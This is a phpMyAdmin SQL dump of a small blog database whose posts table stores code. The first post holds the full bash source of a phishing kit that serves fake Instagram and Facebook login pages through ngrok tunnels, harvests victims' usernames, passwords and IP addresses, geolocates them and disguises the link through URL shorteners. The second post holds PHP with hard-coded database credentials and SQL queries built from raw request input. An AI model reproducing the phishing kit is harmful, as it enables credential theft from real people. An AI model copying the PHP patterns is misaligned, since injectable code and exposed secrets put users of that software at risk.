-- phpMyAdmin SQL Dump
-- version 4.6.6deb5ubuntu0.5
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Dec 04, 2020 at 01:44 AM
-- Server version: 5.7.32-0ubuntu0.18.04.1
-- PHP Version: 7.2.24-0ubuntu0.18.04.7

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `nepdev`
--

-- --------------------------------------------------------

--
-- Table structure for table `categories`
--

CREATE TABLE `categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `categories`
--

INSERT INTO `categories` (`id`, `name`, `created_at`, `updated_at`) VALUES
(1, 'Social Engineering', '2020-12-03 13:22:27', '2020-12-03 13:22:27'),
(2, 'Core PHP', '2020-12-03 13:26:22', '2020-12-03 13:26:22'),
(3, 'Python', '2020-12-03 13:35:02', '2020-12-03 13:35:02');

-- --------------------------------------------------------

--
-- Table structure for table `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(32, '2014_10_12_000000_create_users_table', 1),
(33, '2014_10_12_100000_create_password_resets_table', 1),
(34, '2020_12_01_133901_create_image', 1),
(35, '2020_12_02_181310_create_posts_table', 1),
(36, '2020_12_02_181440_create_categories_table', 1),
(37, '2020_12_02_212809_create_user_role', 1),
(38, '2020_12_03_163654_create_code', 1);

-- --------------------------------------------------------

--
-- Table structure for table `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `posts`
--

CREATE TABLE `posts` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` varchar(1000) COLLATE utf8mb4_unicode_ci NOT NULL,
  `image` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `video` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `category_id` int(11) NOT NULL,
  `published_at` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `code` text COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `posts`
--

INSERT INTO `posts` (`id`, `title`, `description`, `content`, `image`, `video`, `user_id`, `category_id`, `published_at`, `created_at`, `updated_at`, `code`) VALUES
(1, 'Phishing Sites', 'About Hacking Social Accounts', '<div><strong><em>Phishing</em></strong><em> is a cybercrime in which a target or targets are contacted by email, telephone or text message by someone posing as a legitimate institution to lure individuals into providing sensitive data such as personally identifiable information, banking and credit card details, and passwords.<br></em><br></div><pre><strong>G</strong><strong><em>itHub link</em></strong><em> :</em><a href=\" https://github.com/naitik0009/jackphish\"> https://github.com/naitik0009/jackphish</a></pre>', 'post/ZApTB46IcX3jxBOM6O6wkEbENao3Y2Euz1etoyHi.png', 'https://www.youtube.com/embed/zVL4N2Eeozk', 1, 1, '2020-12-04 12:56', '2020-12-03 13:25:25', '2020-12-03 13:25:25', '<div><br></div><div><br></div><div><br></div><div><strong><em>#!/bin/bash<br># jackphish v1.1<br>#*******************************<br># contact : rovinimoni@gmail.com<br>#*******************************<br># @naitik_rauniyar<br>trap \'printf \"\\e[4;35m \\nHEY YOU EXITED MY SCRIPT \\e[0m\\n\";stop;exit 1\' 2<br>dependencies() {<br><br>command -v php &gt; /dev/null 2&gt;&amp;1 || { echo &gt;&amp;2 \"I require php but it\'s not installed. Install it. Aborting.\"; exit 1; }<br>command -v curl &gt; /dev/null 2&gt;&amp;1 || { echo &gt;&amp;2 \"I require curl but it\'s not installed. Install it. Aborting.\"; exit 1; }<br><br>}<br><br>menu() {<br><br>printf \"\\e[1;92m[\\e[0m\\e[1;77m01\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Instagram\\e[0m\\n\"<br>printf \"\\e[1;92m[\\e[0m\\e[1;77m02\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Facebook\\e[0m\\n\"<br>printf \"\\e[1;92m[\\e[0m\\e[1;77m03\\e[0m\\e[1;92m]\\e[0m\\e[1;93m LOVE_TEST\\e[0m\\n\"<br>printf \"\\e[1;92m[\\e[0m\\e[1;77m04\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Exit\\e[0m\\n\"<br><br><br>read -p $\'\\n\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Choose an option: \\e[0m\' option<br><br><br>if [[ $option == 1 || $option == 01 ]]; then<br>server=\"instagram\"<br>start1<br><br>elif [[ $option == 2 || $option == 02 ]]; then<br>server=\"facebook\"<br>start1<br>elif [[ $option == 3 || $option == 03 ]]; then<br>server=\"love_test\"<br>start1<br><br>elif [[ $option == 19 ]]; then<br>server=\"create\"<br>start1<br><br>elif [[ $option == 04 || $option == 4 ]]; then<br>printf \"\\e[1;35m Have a nice day \\e[0m\\n\"<br>exit 1<br><br>else<br>printf \"\\e[1;93m [!] Invalid option!\\e[0m\\n\"<br>sleep 1<br>clear<br>menu<br>fi<br>}<br><br>stop() {<br><br>checkngrok=$(ps aux | grep -o \"ngrok\" | head -n1)<br>checkphp=$(ps aux | grep -o \"php\" | head -n1)<br>checkssh=$(ps aux | grep -o \"ssh\" | head -n1)<br>if [[ $checkngrok == *\'ngrok\'* ]]; then<br>pkill -f -2 ngrok &gt; /dev/null 2&gt;&amp;1<br>killall -2 ngrok &gt; /dev/null 2&gt;&amp;1<br>fi<br>if [[ $checkphp == *\'php\'* ]]; then<br>pkill -f -2 php &gt; /dev/null 2&gt;&amp;1<br>killall -2 php &gt; /dev/null 2&gt;&amp;1<br>fi<br>if [[ $checkssh == *\'ssh\'* ]]; then<br>pkill -f -2 ssh &gt; /dev/null 2&gt;&amp;1<br>killall ssh &gt; /dev/null 2&gt;&amp;1<br>fi<br>if [[ -e sendlink ]]; then<br>rm -rf sendlink<br>fi<br><br>}<br><br>banner() {<br><br>printf \"\\n\"<br>printf \"\\e[101m\\e[1;77m:: you are ::\\e[0m\\n\"<br>printf \"\\e[101m\\e[1;77m:: responsible for any misuse or damage caused by jack ::\\e[0m\\n\"<br>printf \"\\e[101m\\e[1;77m:: use love test only for mobile :: \\e[0m\"<br>printf \"\\n\"<br>printf \"\\e[1;94m<br><br>&nbsp;░░░░░░ ░░░░░░░░░░░░░░ ░░░░░░░░░░░░░░ ░░░░░░ ░░░░░░░░<br>&nbsp;░░▄▀░░ ░░▄▀▄▀▄▀▄▀▄▀░░ ░░▄▀▄▀▄▀▄▀▄▀░░ ░░▄▀░░ ░░▄▀▄▀░░<br>&nbsp;░░▄▀░░ ░░▄▀░░░░░░▄▀░░ ░░▄▀░░░░░░░░░░ ░░▄▀░░ ░░▄▀░░░░<br>&nbsp;░░▄▀░░ ░░▄▀░░ ░░▄▀░░ ░░▄▀░░ ░░▄▀░░ ░░▄▀░░<br>&nbsp;░░▄▀░░ ░░▄▀░░░░░░▄▀░░ ░░▄▀░░ ░░▄▀░░░░░░▄▀░░<br>&nbsp;░░▄▀░░ ░░▄▀▄▀▄▀▄▀▄▀░░ ░░▄▀░░ ░░▄▀▄▀▄▀▄▀▄▀░░&nbsp;<br>&nbsp;░░░░░░ ░░▄▀░░ ░░▄▀░░░░░░▄▀░░ ░░▄▀░░ ░░▄▀░░░░░░▄▀░░<br>&nbsp;░░▄▀░░ ░░▄▀░░ ░░▄▀░░ ░░▄▀░░ ░░▄▀░░ ░░▄▀░░ ░░▄▀░░<br>&nbsp;░░▄▀░░░░░░▄▀░░ ░░▄▀░░ ░░▄▀░░ ░░▄▀░░░░░░░░░░ ░░▄▀░░ ░░▄▀░░░░<br>&nbsp;░░▄▀▄▀▄▀▄▀▄▀░░ ░░▄▀░░ ░░▄▀░░ ░░▄▀▄▀▄▀▄▀▄▀░░ ░░▄▀░░ ░░▄▀▄▀░░<br>&nbsp;░░░░░░░░░░░░░░ ░░░░░░ ░░░░░░ ░░░░░░░░░░░░░░ ░░░░░░ ░░░░░░░░ \\e[0m\\n\"<br>printf \"\\n\"<br>printf \"\\e[101;93m .:.:.\\e[0m\\e[101;77m Phishing Tool generated by : @naitik_rauniyar \\e[0m\\e[101;93m.:.:.\\e[0m\\n\"<br>printf \"\\n\"<br><br>}<br><br><br>catch_cred() {<br><br>account=$(grep -o \'Account:.*\' sites/$server/usernames.txt | cut -d \" \" -f2)<br>IFS=$\'\\n\'<br>password=$(grep -o \'Pass:.*\' sites/$server/usernames.txt | cut -d \":\" -f2)<br>printf \"\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m]\\e[0m\\e[1;92m Account:\\e[0m\\e[1;77m %s\\n\\e[0m\" $account<br>printf \"\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m]\\e[0m\\e[1;92m Password:\\e[0m\\e[1;77m %s\\n\\e[0m\" $password<br>cat sites/$server/usernames.txt &gt;&gt; sites/$server/saved.usernames.txt<br>printf \"\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Saved:\\e[0m\\e[1;77m sites/%s/saved.usernames.txt\\e[0m\\n\" $server<br>printf \"\\n\"<br>printf \"\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Waiting Next IP and Next Credentials, Press Ctrl + C to exit...\\e[0m\\n\"<br><br>}<br><br><br>catch_ip() {<br>touch sites/$server/saved.usernames.txt<br>ip=$(grep -a \'IP:\' sites/$server/ip.txt | cut -d \" \" -f2 | tr -d \'\\r\')<br>IFS=$\'\\n\'<br>ua=$(grep \'User-Agent:\' sites/$server/ip.txt | cut -d \'\"\' -f2)<br>printf \"\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Target IP:\\e[0m\\e[1;77m %s\\e[0m\\n\" $ip<br>printf \"\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] User-Agent:\\e[0m\\e[1;77m %s\\e[0m\\n\" $ua<br>printf \"\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Saved:\\e[0m\\e[1;77m %s/saved.ip.txt\\e[0m\\n\" $server<br>cat sites/$server/ip.txt &gt;&gt; sites/$server/saved.ip.txt<br><br>if [[ -e iptracker.log ]]; then<br>rm -rf iptracker.log<br>fi<br><br>IFS=\'\\n\'<br>iptracker=$(curl -s -L \"www.ip-tracker.org/locator/ip-lookup.php?ip=$ip\" --user-agent \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31\" &gt; iptracker.log)<br>IFS=$\'\\n\'<br>continent=$(grep -o \'Continent.*\' iptracker.log | head -n1 | cut -d \"&gt;\" -f3 | cut -d \"&lt;\" -f1)<br>printf \"\\n\"<br>hostnameip=$(grep -o \"&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;Hostname:.*\" iptracker.log | cut -d \"&lt;\" -f7 | cut -d \"&gt;\" -f2)<br>if [[ $hostnameip != \"\" ]]; then<br>printf \"\\e[1;92m[*] Hostname:\\e[0m\\e[1;77m %s\\e[0m\\n\" $hostnameip<br>fi<br>##<br><br>reverse_dns=$(grep -a \"&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;Hostname:.*\" iptracker.log | cut -d \"&lt;\" -f1)<br>if [[ $reverse_dns != \"\" ]]; then<br>printf \"\\e[1;92m[*] Reverse DNS:\\e[0m\\e[1;77m %s\\e[0m\\n\" $reverse_dns<br>fi<br>##<br><br><br>if [[ $continent != \"\" ]]; then<br>printf \"\\e[1;92m[*] IP Continent:\\e[0m\\e[1;77m %s\\e[0m\\n\" $continent<br>fi<br>##<br><br>country=$(grep -o \'Country:.*\' iptracker.log | cut -d \"&gt;\" -f3 | cut -d \"&amp;\" -f1)<br>if [[ $country != \"\" ]]; then<br>printf \"\\e[1;92m[*] IP Country:\\e[0m\\e[1;77m %s\\e[0m\\n\" $country<br>fi<br>##<br><br>state=$(grep -o \"tracking lessimpt.*\" iptracker.log | cut -d \"&lt;\" -f1 | cut -d \"&gt;\" -f2)<br>if [[ $state != \"\" ]]; then<br>printf \"\\e[1;92m[*] State:\\e[0m\\e[1;77m %s\\e[0m\\n\" $state<br>fi<br>##<br>city=$(grep -o \"City Location:.*\" iptracker.log | cut -d \"&lt;\" -f3 | cut -d \"&gt;\" -f2)<br><br>if [[ $city != \"\" ]]; then<br>printf \"\\e[1;92m[*] City Location:\\e[0m\\e[1;77m %s\\e[0m\\n\" $city<br>fi<br>##<br><br>isp=$(grep -o \"ISP:.*\" iptracker.log | cut -d \"&lt;\" -f3 | cut -d \"&gt;\" -f2)<br>if [[ $isp != \"\" ]]; then<br>printf \"\\e[1;92m[*] ISP:\\e[0m\\e[1;77m %s\\e[0m\\n\" $isp<br>fi<br>##<br><br>as_number=$(grep -o \"AS Number:.*\" iptracker.log | cut -d \"&lt;\" -f3 | cut -d \"&gt;\" -f2)<br>if [[ $as_number != \"\" ]]; then<br>printf \"\\e[1;92m[*] AS Number:\\e[0m\\e[1;77m %s\\e[0m\\n\" $as_number<br>fi<br>##<br><br>ip_speed=$(grep -o \"IP Address Speed:.*\" iptracker.log | cut -d \"&lt;\" -f3 | cut -d \"&gt;\" -f2)<br>if [[ $ip_speed != \"\" ]]; then<br>printf \"\\e[1;92m[*] IP Address Speed:\\e[0m\\e[1;77m %s\\e[0m\\n\" $ip_speed<br>fi<br>##<br>ip_currency=$(grep -o \"IP Currency:.*\" iptracker.log | cut -d \"&lt;\" -f3 | cut -d \"&gt;\" -f2)<br><br>if [[ $ip_currency != \"\" ]]; then<br>printf \"\\e[1;92m[*] IP Currency:\\e[0m\\e[1;77m %s\\e[0m\\n\" $ip_currency<br>fi<br>##<br>printf \"\\n\"<br>rm -rf iptracker.log<br>printf \"\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Waiting Credentials and Next IP, Press Ctrl + C to exit...\\e[0m\\n\"<br><br>}<br><br><br><br>serverx() {<br>printf \"\\e[1;92m[\\e[0m*\\e[1;92m] Starting php server...\\n\"<br>cd sites/$server &amp;&amp; php -S 127.0.0.1:$port &gt; /dev/null 2&gt;&amp;1 &amp;<br>sleep 2<br>printf \"\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Starting server...\\e[0m\\n\"<br>command -v ssh &gt; /dev/null 2&gt;&amp;1 || { echo &gt;&amp;2 \"I require SSH but it\'s not installed. Install it. Aborting.\"; exit 1; }<br>if [[ -e sendlink ]]; then<br>rm -rf sendlink<br>fi<br>$(which sh) -c \'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:\'$port\' serveo.net 2&gt; /dev/null &gt; sendlink \' &amp;<br>printf \"\\n\"<br>sleep 10<br>send_link=$(grep -o \"https://[0-9a-z]*\\.serveo.net\" sendlink)<br>printf \"\\n\"<br>printf \'\\n\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Send the direct link to target:\\e[0m\\e[1;77m %s \\n\' $send_link<br><br>send_ip=$(curl -s \"http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&amp;redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&amp;event=video_description&amp;q=$send_link\" | head -n1)<br>#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)<br>printf \'\\n\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Or using tinyurl:\\e[0m\\e[1;77m %s \\n\' $send_ip<br>printf \"\\n\"<br>checkfound<br><br><br>}<br><br>startx() {<br>if [[ -e sites/$server/ip.txt ]]; then<br>rm -rf sites/$server/ip.txt<br><br>fi<br>if [[ -e sites/$server/usernames.txt ]]; then<br>rm -rf sites/$server/usernames.txt<br><br>fi<br><br>default_port=\"3333\" #$(seq 1111 4444 | sort -R | head -n1)<br>printf \'\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Choose a Port (Default:\\e[0m\\e[1;77m %s \\e[0m\\e[1;92m): \\e[0m\' $default_port<br>read port<br>port=\"${port:-${default_port}}\"<br>serverx<br><br>}<br><br><br>start() {<br>if [[ -e sites/$server/ip.txt ]]; then<br>rm -rf sites/$server/ip.txt<br><br>fi<br>if [[ -e sites/$server/usernames.txt ]]; then<br>rm -rf sites/$server/usernames.txt<br><br>fi<br><br><br>if [[ -e ngrok ]]; then<br>echo \"\"<br>else<br>command -v unzip &gt; /dev/null 2&gt;&amp;1 || { echo &gt;&amp;2 \"I require unzip but it\'s not installed. Install it. Aborting.\"; exit 1; }<br>command -v wget &gt; /dev/null 2&gt;&amp;1 || { echo &gt;&amp;2 \"I require wget but it\'s not installed. Install it. Aborting.\"; exit 1; }<br>printf \"\\e[1;92m[\\e[0m*\\e[1;92m] Downloading Ngrok...\\n\"<br>arch=$(uname -a | grep -o \'arm\' | head -n1)<br>arch2=$(uname -a | grep -o \'Android\' | head -n1)<br>if [[ $arch == *\'arm\'* ]] || [[ $arch2 == *\'Android\'* ]] ; then<br>wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip &gt; /dev/null 2&gt;&amp;1<br><br>if [[ -e ngrok-stable-linux-arm.zip ]]; then<br>unzip ngrok-stable-linux-arm.zip &gt; /dev/null 2&gt;&amp;1<br>chmod +x ngrok<br>rm -rf ngrok-stable-linux-arm.zip<br>else<br>printf \"\\e[1;93m[!] Download error... Termux, run:\\e[0m\\e[1;77m pkg install wget\\e[0m\\n\"<br>exit 1<br>fi<br><br><br><br>else<br>wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip &gt; /dev/null 2&gt;&amp;1<br>if [[ -e ngrok-stable-linux-386.zip ]]; then<br>unzip ngrok-stable-linux-386.zip &gt; /dev/null 2&gt;&amp;1<br>chmod +x ngrok<br>rm -rf ngrok-stable-linux-386.zip<br>else<br>printf \"\\e[1;93m[!] Download error... \\e[0m\\n\"<br>exit 1<br>fi<br>fi<br>fi<br><br>printf \"\\e[1;92m[\\e[0m*\\e[1;92m] Starting php server...\\n\"<br>cd sites/$server &amp;&amp; php -S 127.0.0.1:3333 &gt; /dev/null 2&gt;&amp;1 &amp;<br>sleep 2<br>printf \"\\e[1;92m[\\e[0m*\\e[1;92m] Starting ngrok server...\\n\"<br>./ngrok http 127.0.0.1:3333 &gt; /dev/null 2&gt;&amp;1 &amp;<br>sleep 10<br><br>link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o \"https://[0-9a-z]*\\.ngrok.io\")<br>printf \"\\e[1;92m[\\e[0m*\\e[1;92m] Send this link to the Target:\\e[0m\\e[1;77m %s\\e[0m\\n\" $link<br>send_ip=$(curl -s \"http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&amp;redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&amp;event=video_description&amp;q=$link\" | head -n1)<br>#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)<br>printf \'\\n\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Or using tinyurl:\\e[0m\\e[1;77m %s \\n\' $send_ip<br>printf \"\\n\"<br><br>checkfound<br>}<br><br>start1() {<br>if [[ -e sendlink ]]; then<br>rm -rf sendlink<br>fi<br><br><br>#printf \"\\n\"<br>#printf \"\\e[1;92m[\\e[0m\\e[1;77m01\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Serveo.net (SSH Tunneling, Best!)\\e[0m\\n\"<br>#printf \"\\e[1;92m[\\e[0m\\e[1;77m02\\e[0m\\e[1;92m]\\e[0m\\e[1;93m Ngrok\\e[0m\\n\"<br>#default_option_server=\"1\"<br>#read -p $\'\\n\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Choose a Port Forwarding option: \\e[0m\' option_server<br>#option_server=\"${option_server:-${default_option_server}}\"<br>#if [[ $option_server == 1 || $option_server == 01 ]]; then<br>#startx<br><br>#elif [[ $option_server == 2 || $option_server == 02 ]]; then<br>start<br>#else<br>#printf \"\\e[1;93m [!] Invalid option!\\e[0m\\n\"<br>#sleep 1<br>#clear<br>#start1<br>#fi<br><br>}<br>checkfound() {<br><br>printf \"\\n\"<br>printf \"\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Waiting IPs and Credentials,\\e[0m\\e[1;77m Press Ctrl + C to exit...\\e[0m\\n\"<br>while [ true ]; do<br><br><br>if [[ -e \"sites/$server/ip.txt\" ]]; then<br>printf \"\\n\\e[1;92m[\\e[0m*\\e[1;92m] IP Found!\\n\"<br>catch_ip<br>rm -rf sites/$server/ip.txt<br>fi<br>sleep 0.5<br>if [[ -e \"sites/$server/usernames.txt\" ]]; then<br>printf \"\\n\\e[1;93m[\\e[0m*\\e[1;93m]\\e[0m\\e[1;92m Credentials Found!\\n\"<br>catch_cred<br>rm -rf sites/$server/usernames.txt<br>fi<br>sleep 0.5<br><br><br>done<br><br>}<br>banner<br>dependencies<br>menu<br></em></strong><br></div><div><br></div>'),
(2, 'Core PHP', 'About PHP', '<div><strong><em>PHP is a general-purpose scripting language especially suited to web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1994. The PHP reference implementation is now produced by The PHP Group<br></em></strong><br></div><pre><strong>I have made todo using core php link :&nbsp;</strong><a href=\"https://github.com/naitik0009/note_no-js\">https://github.com/naitik0009/note_no-js</a></pre>', 'post/lLI3VRIxZWE2nlygXUMUNUOEIuveQ8Y1LfNRuQzc.png', 'https://youtube.com/embed/qHRlxFOLgxs', 1, 2, '2020-12-04 01:05', '2020-12-03 13:30:49', '2020-12-03 13:30:49', '<pre><strong><em>&lt;!DOCTYPE html&gt;\r\n&lt;html lang=\"en\"&gt;\r\n&lt;head&gt;\r\n&lt;meta charset=\"UTF-8\"&gt;\r\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\r\n&lt;title&gt;Document&lt;/title&gt;\r\n&lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\" integrity=\"sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z\" crossorigin=\"anonymous\"&gt;\r\n\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;?php\r\n$tits=\"\";\r\n$cont=\"\";\r\n$update =false;\r\n\r\n// require_once \'capture.php\';\r\n\r\n// if(isset($session[\'message\'])){\r\n// echo \'&lt;div class=\"alert alert-success\" role=\"alert\"&gt;\r\n// succed!\r\n// &lt;/div&gt;\';\r\n// }\r\n$server = \"sql210.epizy.com\";\r\n$username = \"epiz_26584774\";\r\n$passowrd = \"T2x81zHhsm\";\r\n$database = \"epiz_26584774_advance\";\r\n$connection = mysqli_connect($server,$username,$passowrd,$database);\r\n\r\n// if ($connection){\r\n// echo \"connection successfull\";\r\n// }\r\n// else{\r\n// die(mysqli_connect_error());\r\n// }\r\n\r\nif(isset($_POST[\'submit\'])){\r\n$title = $_POST[\'title\'];\r\n$content = $_POST[\'content\'];\r\n$insert = \"INSERT INTO `notes` (title,content) VALUES (\'$title\',\'$content\')\";\r\n$ok = mysqli_query($connection,$insert);\r\n$session[\'message\'] = \'Record has been posted\';\r\n$session[\'msg_type\'] = \'success\';\r\n// header(\"location : index.php\");\r\n}\r\nif(isset($_GET[\'delete\'])){\r\n$id = $_GET[\'delete\'];\r\n$delete = \"DELETE FROM `notes` WHERE `notes`.`id` = \'$id\' \";\r\n$sets = mysqli_query($connection,$delete);\r\n$session[\'message\'] = \'Record has been deleted\';\r\n$session[\'msg_type\'] = \'success\';\r\n// header(\"location : index.php\");\r\n}\r\nif (isset($_GET[\'edit\'])){\r\n$ID = $_GET[\'edit\'];\r\n$update = true;\r\n\r\n$edits = \"SELECT * FROM `notes` WHERE id= \'$ID\' \";\r\n\r\n\r\n$edit = mysqli_query($connection,$edits);\r\n\r\n\r\n\r\nwhile($sho = mysqli_fetch_array($edit)){\r\n$tits = $sho[\'title\'];\r\n$cont = $sho[\'content\'];\r\n }\r\n\r\n}\r\nif(isset($_POST[\'update\'])){\r\n$id=$_POST[\'id\'];\r\n// $id= $_GET[\'edit\'];\r\n$ti = $_POST[\'title\'];\r\n$co = $_POST[\'content\'];\r\n$upd = \"UPDATE `notes` SET `title` = \'$ti\' , `content` = \'$co\' WHERE `id` = \'$id\' \";\r\n$q = mysqli_query($connection,$upd);\r\nif($q){\r\necho \"wow\";\r\n }\r\nelse{\r\ndie(mysqli_connect_error());\r\n }\r\nheader(\'location: index.php\');\r\n}\r\n?&gt;\r\n&lt;nav class=\"navbar navbar-expand-lg navbar-light bg-light\"&gt;\r\n&lt;a class=\"navbar-brand\" href=\"#\"&gt;Notes&lt;/a&gt;\r\n&lt;button class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt;\r\n&lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt;\r\n&lt;/button&gt;\r\n\r\n&lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt;\r\n&lt;ul class=\"navbar-nav mr-auto\"&gt;\r\n&lt;li class=\"nav-item active\"&gt;\r\n&lt;a class=\"nav-link\" href=\"#\"&gt;Home &lt;span class=\"sr-only\"&gt;(current)&lt;/span&gt;&lt;/a&gt;\r\n&lt;/li&gt;\r\n&lt;li class=\"nav-item active\"&gt;\r\n&lt;a class=\"nav-link\" href=\"#\"&gt;about&lt;/a&gt;\r\n&lt;/li&gt;\r\n\r\n&lt;li class=\"nav-item active\"&gt;\r\n&lt;a class=\"nav-link\" href=\"#\" &gt;contact us&lt;/a&gt;\r\n&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;!-- &lt;form class=\"form-inline my-2 my-lg-0\"&gt;\r\n &lt;input class=\"form-control mr-sm-2\" type=\"search\" placeholder=\"Search\" aria-label=\"Search\"&gt;\r\n &lt;button class=\"btn btn-outline-success my-2 my-sm-0\" type=\"submit\"&gt;Search&lt;/button&gt;\r\n &lt;/form&gt; --&gt;\r\n&lt;/div&gt;\r\n&lt;/nav&gt;\r\n\r\n&lt;div class=\"container\"&gt;\r\n&lt;form action=\"index.php\" method=\"POST\"&gt;\r\n&lt;input type=\"hidden\" name=id value=\"&lt;?php $id=$_GET[\'edit\']; echo $id; ?&gt;\" &gt;\r\n&lt;div class=\"form-group\"&gt;\r\n&lt;label for=\"exampleInputEmail1\"&gt;title&lt;/label&gt;\r\n&lt;input type=\"text\" class=\"form-control\" value=\"&lt;?php echo $tits; ?&gt;\" id=\"exampleInputEmail1\" name=\"title\" aria-describedby=\"emailHelp\"&gt;\r\n\r\n&lt;/div&gt;\r\n&lt;div class=\"form-group\"&gt;\r\n&lt;label for=\"exampleFormControlTextarea1\"&gt;content&lt;/label&gt;\r\n&lt;textarea class=\"form-control\" id=\"exampleFormControlTextarea1\" name=\"content\" rows=\"3\"&gt;&lt;?php echo \"\".$cont; ?&gt;&lt;/textarea&gt;\r\n&lt;/div&gt;\r\n&lt;div class=\"form-group form-check\"&gt;\r\n&lt;input type=\"checkbox\" class=\"form-check-input\" id=\"exampleCheck1\"&gt;\r\n&lt;label class=\"form-check-label\" for=\"exampleCheck1\"&gt;Check me out&lt;/label&gt;\r\n&lt;/div&gt;\r\n&lt;?php\r\nif($update==true): ?&gt;\r\n&lt;button type=\"submit\" name=\"update\" class=\"btn btn-primary\"&gt;update&lt;/button&gt;\r\n\r\n\r\n&lt;?php\r\nelse: ?&gt;\r\n&lt;button type=\"submit\" name=\"submit\" class=\"btn btn-primary\"&gt;Submit&lt;/button&gt;\r\n&lt;?php endif ?&gt;\r\n&lt;/form&gt;\r\n&lt;/div&gt;\r\n&lt;br&gt;\r\n&lt;div class=\"container\"&gt;\r\n&lt;table class=\"table\"&gt;\r\n&lt;thead class=\"thead-dark\"&gt;\r\n&lt;tr&gt;\r\n&lt;th scope=\"col\"&gt;id&lt;/th&gt;\r\n&lt;th 